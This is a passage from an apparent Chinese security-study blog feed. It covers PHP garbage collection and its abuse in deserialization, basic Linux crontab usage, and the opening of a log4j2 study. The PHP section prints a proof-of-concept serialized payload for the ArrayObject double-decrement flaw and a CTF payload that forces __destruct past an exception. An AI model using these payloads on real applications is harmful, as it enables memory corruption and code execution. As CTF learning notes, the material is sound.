);<br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">测试字符串引用计数<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>)<br>a:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">1</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;new string&#x27;</span> (length=<span class="hljs-number">10</span>) <span class="hljs-comment">//取地址引用时会改变</span><br>测试数组引用计数<br>c:(refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">3</span>, is_ref=<span class="hljs-number">0</span>) <br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">2</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>c:(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-comment">//数组值改变后，之前引用全部废弃</span><br><span class="hljs-keyword">array</span> (size=<span class="hljs-number">3</span>)<br>  <span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;a&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;b&#x27;</span> (length=<span class="hljs-number">1</span>)<br>  <span class="hljs-number">2</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;c&#x27;</span> (length=<span class="hljs-number">1</span>)<br>测试<span class="hljs-keyword">int</span>型计数e:(refcount=<span class="hljs-number">0</span>, is_ref=<span class="hljs-number">0</span>)<span class="hljs-keyword">int</span> <span class="hljs-number">1</span>  <span class="hljs-comment">//int型不计引用次数</span><br></code></pre></td></tr></table></figure><h3 id="回收周期"><a href="#回收周期" class="headerlink" title="回收周期"></a>回收周期</h3><p>PHP垃圾回收机制默认打开，可以设置php.ini值的<code>zend.enable_gc</code>，或者调用gc_enable() 和 gc_disable()函数。</p><p>当垃圾回收机制打开时，算法判断在根缓存区满时，执行循环查找，根缓存区大小需要通过修改php源码文件Zend&#x2F;zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES，然后重新编译PHP，来修改这个值。</p><blockquote><p>调用gc_disable()函数释放内存之前，先调用gc_collect_cycles()函数，以免根缓存区空间不足</p></blockquote><h3 id="垃圾的产生"><a href="#垃圾的产生" class="headerlink" title="垃圾的产生"></a>垃圾的产生</h3><p>PHP中一些复杂数据类型头部有一个GC，用于支持垃圾回收。</p><p>zend_reference 这个类型，这个是 PHP7 新增的变量类型，当对变量使用 “&amp;” 操作时，<u>会创建新的中间结构体 zend_reference，这个结构体会真正的指向对应的 value 结构。</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 当进行如下赋值操作时</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;hello&#x27;</span>; <span class="hljs-comment">// $a -&gt; zend_string</span><br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b,$a -&gt; zend_string</span><br><span class="hljs-variable">$c</span> = &amp;<span class="hljs-variable">$b</span>; <span class="hljs-comment">// $c,$b -&gt; zval(type = IS_REFERENCE, refcount = 2) -&gt; zend_string</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072213238.png" alt="image-20230405153644317"></p><blockquote><p><code>$b和$c</code>的zval都是通过中间结构体再指向最终的zend_string</p></blockquote><h3 id="回收的过程"><a href="#回收的过程" class="headerlink" title="回收的过程"></a>回收的过程</h3><p>如果当变量的 refcount 减小后大于 0，PHP 并不会立即对这个变量进行垃圾鉴定和回收，而是放入一个缓冲区中，等这个缓冲区满了以后 (10000 个值) 再统一进行处理，加入缓冲区的是变量 zend_value 里的 gc，目前垃圾只会出现在数组和对象两种类型中，数组的情况上面已经介绍了，对象的情况则是成员属性引用对象本身导致的，其它类型不会出现这种变量中的成员引用变量自身的情况，所以垃圾回收只会处理这两种类型的变量。</p><p>gc 的结构 zend_refcounted_h 具体如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_zend_refcounted_h</span> &#123;<br>    <span class="hljs-type">uint32_t</span>         refcount; <span class="hljs-comment">// 记录 zend_value 的引用数</span><br>    <span class="hljs-keyword">union</span> &#123;<br>        <span class="hljs-keyword">struct</span> &#123;<br>            zend_uchar    type,  <span class="hljs-comment">// zend_value的类型, 与zval.u1.type一致</span><br>            zend_uchar    flags, <br>            <span class="hljs-type">uint16_t</span>      gc_info <span class="hljs-comment">// GC信息，记录在 gc 池中的位置和颜色，垃圾回收的过程会用到</span><br>        &#125; v;<br>        <span class="hljs-type">uint32_t</span> type_info;<br>    &#125; u;<br>&#125; zend_refcounted_h;<br></code></pre></td></tr></table></figure><p>一个变量只能加入一次缓冲区，为了防止重复加入，变量加入后会把 zend_refcounted_h.gc_info 置为 GC_PURPLE，即标为紫色，后续不会重复插入。</p><h2 id="反序列化中的利用"><a href="#反序列化中的利用" class="headerlink" title="反序列化中的利用"></a>反序列化中的利用</h2><h3 id="destruct魔术方法"><a href="#destruct魔术方法" class="headerlink" title="__destruct魔术方法"></a>__destruct魔术方法</h3><p>当某个对象成为垃圾或者当对象被显式销毁时执行</p><ul><li>显示销毁：unset或赋值NULL</li><li>隐式销毁：代码执行完毕后将所有申请的内存释放掉</li></ul><blockquote><p>在常规思路中destruct是隐式销毁触发的,尝试显式销毁</p></blockquote><h3 id="旧版本GC"><a href="#旧版本GC" class="headerlink" title="旧版本GC"></a>旧版本GC</h3><p>简单的判断了一下变量的zval的refcount是否为0，是的话就释放否则不释放直至进程结束。</p><h3 id="新版本GC-zval结构体"><a href="#新版本GC-zval结构体" class="headerlink" title="新版本GC-zval结构体"></a>新版本GC-zval结构体</h3><p>主动销毁变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;111&quot;</span>;<br><span class="hljs-variable">$temp_name</span> = &amp;<span class="hljs-variable">$name</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$temp_name</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span><br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span><br></code></pre></td></tr></table></figure><p>refcount计数减1，说明unset并非一定会释放内存，当有两个变量指向的时候，并非会释放变量占用的内存，只是refcount减1.</p><h3 id="触发垃圾回收"><a href="#触发垃圾回收" class="headerlink" title="触发垃圾回收"></a>触发垃圾回收</h3><p>该算法的实现可以在<code>Zend/zend_gc.c</code>（ <a href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c">https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c</a> ）中找到。每当销毁zval时（如在该zval上调用unset时），垃圾回收算法会检查其是否为数组或对象，除了这俩个类型外其他都不能包含循环引用，这一检查过程使用<code>gc_zval_possible_root</code>函数来实现。任何这种潜在的zval都被称为根（Root），并会被添加到一个名为<code>gc_root_buffer</code>的列表中。<br>然后，将会重复上述步骤，直至满足下述条件之一：</p><ul><li><code>gc_collect_cycles()</code>被手动调用</li><li>垃圾存储空间将满。这也就意味着，在根缓冲区的位置已经存储了10000个zval，并且即将添加新的根。10000时预定义常量GC_ROOT_BUFFER_MAX_ENTRIES,当出现第10001个zval时，将再次调用gc_zval_possible_root进行检查，此时会调用<code>gc_collect_cycles</code>以处理并刷新当前缓冲区</li></ul><blockquote><p>可以得到触发思路，填满垃圾存储空间</p></blockquote><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化过程允许一遍又一遍地传递相同的索引，所以不断会填充内存空间。一旦重新使用数组索引，旧元素的引用计数器就会递减。在反序列化过程中将会调用<code>zend_hash_update</code>，它将调用旧元素的析构函数（Destructor）。每当zval被销毁时，都会涉及到垃圾回收。这也就意味着，所有创建的数组都会开始填充垃圾缓冲区，直至超出其空间导致对<code>gc_collect_cycles</code>的调用。</p><h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// POC of the ArrayObject GC vulnerability</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$serialized_string</span> = <span class="hljs-string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$outer_array</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized_string</span>);<br><span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><span class="hljs-variable">$filler1</span> = <span class="hljs-string">&quot;aaaa&quot;</span>;<br><span class="hljs-variable">$filler2</span> = <span class="hljs-string">&quot;bbbb&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$outer_array</span>);<br></code></pre></td></tr></table></figure><p>实际上，一旦该示例执行，外部数组（由<code>$outer_array</code>引用）将会被释放，并且zval将会被<code>$filter2</code>的zval覆盖，导致输出”bbbb”。</p><p>ArrayObject的反序列化函数接受对另一个数组的引用，以用于初始化的目的。这也就意味着，一旦我们对一个ArrayObject进行反序列化后，就可以引用任何之前已经被反序列化过的数组。此外，这还将允许我们将整个哈希表中的所有条目递减两次。</p><p>1、得到一个应被释放的目标zval X；<br>2、创建一个数组Y，其中包含几处对zval X的引用：<code>array(ref_to_X, ref_to_X, […], ref_to_X)</code>；<br>3、创建一个ArrayObject，它将使用数组Y的内容进行初始化，因此会返回一次由垃圾回收标记算法访问过的数组Y的所有子元素。<br>通过上述步骤，我们可以操纵标记算法，对数组Y中的所有引用实现两次访问。但是，在反序列化过程中创建引用将会导致引用计数器增加2，所以还要找到解决方案：<br>4、使用与步骤3相同的方法，额外再创建一个ArrayObject。<br>一旦标记算法访问第二个ArrayObject，它将开始对数组Y中的所有引用进行第三次递减。我们现在就有方法能够使引用计数器递减，可以将该方法用于对任意目标zval的引用计数器实现清零。</p><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$flag</span> =<span class="hljs-string">&quot;flag&#123;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(time).<span class="hljs-string">&quot;&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;中途退出啦&#x27;</span>);<br></code></pre></td></tr></table></figure><p>我们假如要执行__destruct方法，打印flag，就得绕过这个<code>throw new Exception</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而<code>exception</code>会中断该进程对该对象的销毁。所以我们需要强制让php的GC（垃圾回收机制）去进行该对象的回收。</p><p>核心思想：反序列化一个数组，然后再利用第一个索引，来触发GC</p><p>EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;AndyNoel&quot;</span>;<br>    &#125;<br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> B, <span class="hljs-keyword">new</span> B));<br><br><span class="hljs-comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。该漏洞称为“双递减漏洞”</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> gc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux定时任务</title>
      <link href="/2022/10/07/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
      <url>/2022/10/07/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux定时任务"><a href="#Linux定时任务" class="headerlink" title="Linux定时任务"></a>Linux定时任务</h1><p><a href="https://www.jianshu.com/p/f87f17cba27b">https://www.jianshu.com/p/f87f17cba27b</a></p><h2 id="crond简介"><a href="#crond简介" class="headerlink" title="crond简介"></a>crond简介</h2><p>crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。该系统服务默认启动，linux系统也提供了使用者控制计划任务的命令：crontab命令。</p><h3 id="相关配置文件"><a href="#相关配置文件" class="headerlink" title="相关配置文件"></a>相关配置文件</h3><ul><li><p><code>/var/spool/cron/crontabs/</code> 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名。</p></li><li><p><code>/etc/crontab</code> 这个文件负责调度各种管理和维护任务。</p></li><li><p><code>/etc/cron.d/</code> 这个目录用来存放任何要执行的crontab文件或脚本。</p></li><li><p>我们还可以把脚本放在<code>/etc/cron.hourly</code>、<code>/etc/cron.daily</code>、<code>/etc/cron.weekly</code>、<code>/etc/cron.monthly</code>目录中，让它每小时&#x2F;天&#x2F;星期&#x2F;月执行一次。</p></li></ul><h3 id="Linux下任务调度"><a href="#Linux下任务调度" class="headerlink" title="Linux下任务调度"></a>Linux下任务调度</h3><ul><li>系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。<code>/etc/crontab</code>文件就是系统任务调度的配置文件。</li><li>用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab文件都被保存在 <code>/var/spool/cron/crontabs/</code>目录中，其文件名与用户名一致。</li></ul><h2 id="crontab文件"><a href="#crontab文件" class="headerlink" title="crontab文件"></a>crontab文件</h2><p>查看<code>/etc/crontab</code>，内容为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/sh</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br><span class="hljs-number">17</span> *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br><span class="hljs-number">25</span> <span class="hljs-number">6</span>    * * *   root    test -x /usr/sbin/anacron |<span class="hljs-params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br><span class="hljs-number">47</span> <span class="hljs-number">6</span>    * * <span class="hljs-number">7</span>   root    test -x /usr/sbin/anacron |<span class="hljs-params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br><span class="hljs-number">52</span> <span class="hljs-number">6</span>    <span class="hljs-number">1</span> * *   root    test -x /usr/sbin/anacron |<span class="hljs-params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><p>第一行SHELL变量指定了系统要使用哪个shell；第二行PATH变量指定了系统执行 命令的路径。<br>接下来的命令格式为：<br><code>m h dom mon dow user command</code><br>英文全拼为：<br><code>minute hour day month week user commond</code></p><ul><li>minute：表示分钟，可以是从0到59之间的任何整数。</li><li>hour：表示小时，可以是从0到23之间的任何整数。</li><li>day：表示日期，可以是从1到31之间的任何整数。</li><li>month：表示月份，可以是从1到12之间的任何整数。</li><li>week：表示星期几，可以是从0到7之间的任何整数，<u>这里的0或7代表星期日</u>。</li><li>user：表示用户。</li><li>command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</li></ul><blockquote><p> 注意<code>/var/spool/cron</code>目录中的用户调度任务，没有user一项，因为文件名已经代表了user。</p></blockquote><p>在以上各个字段中，还可以使用以下特殊字符：</p><ul><li>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</li><li>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</li><li>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</li><li>正斜线（&#x2F;）：可以用正斜线指定时间的间隔频率，例如“0-23&#x2F;2”表示每两小时执行一次。</li><li>同时正斜线可以和星号一起使用，例如*&#x2F;10，如果用在minute字段，表示每十分钟执行一次。</li></ul><h2 id="crontab命令"><a href="#crontab命令" class="headerlink" title="crontab命令"></a>crontab命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">crontab [-u username] [file] [ -e | -l | -r]<br>-u 指定设置某用户crontab<br>file 将file作为crontab的任务列表文件<br>-e 编辑某用户crontab<br>-l 显示某用户crontab<br>-r 删除某用户crontab<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞学习</title>
      <link href="/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2漏洞学习"><a href="#log4j2漏洞学习" class="headerlink" title="log4j2漏洞学习"></a>log4j2漏洞学习</h1><h2 id="log4j与log4j2区别"><a href="#log4j与log4j2区别" class="headerlink" title="log4j与log4j2区别"></a>log4j与log4j2区别</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>log4j用.properties的文件作为主配置文件的，而现在的log4j 2则已经弃用了这种方式，采用的是.xml，.json或者.jsn这种方式来做</p><h3 id="核心jar包"><a href="#核心jar包" class="headerlink" title="核心jar包"></a>核心jar包</h3><p>log4j只需要引入一个jar包即可，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>而log4j 2则是需要2个核心</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>log4j和log4j 2的包路径是不同的,甚至可以在一个项目中使用2个版本的日志输出</p></blockquote><h3 id="文件渲染"><a href="#文件渲染" class="headerlink" title="文件渲染"></a>文件渲染</h3><p>log4j想要生效，我们需要在web.xml中进行配置</p><p>log4j2就比较简单，以maven工程为例，我们只需要把log4j2.xml放到工程resource目录下就行了。大家记住一个细节点，是log4j2.xml，而不是log4j.xml，<u>xml名字少个2都不行</u></p><h3 id="log调用"><a href="#log调用" class="headerlink" title="log调用"></a>log调用</h3><p>log4j</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> Logger.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><p>log4j2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Level;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><p>如果log4j.properties一直不起作用，将其复制到target的classesxia</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qwvy8e0hj30r8056glt.jpg" alt="image-20221002140908570"></p><h3 id="一些配置教训"><a href="#一些配置教训" class="headerlink" title="一些配置教训"></a>一些配置教训</h3><p>注意版本对应</p><p>如果是2021.3的idea，不要使用高版本maven，应使用3.5.4</p><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>第一次引入会因为没有下载而爆红，点击刷新即可</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232951.jpg" alt="image-20221002141921173"></p><h3 id="导包注意名称"><a href="#导包注意名称" class="headerlink" title="导包注意名称"></a>导包注意名称</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br></code></pre></td></tr></table></figure><blockquote><p>2.14.0 log4j导包</p></blockquote><h3 id="程序包-com-sun-jndi-rmi-registry-不可见"><a href="#程序包-com-sun-jndi-rmi-registry-不可见" class="headerlink" title="程序包 com.sun.jndi.rmi.registry 不可见"></a>程序包 com.sun.jndi.rmi.registry 不可见</h3><p>注意：还是得换成jdk1.8</p><p>解决，在pom.xml中加入以下标签</p><figure 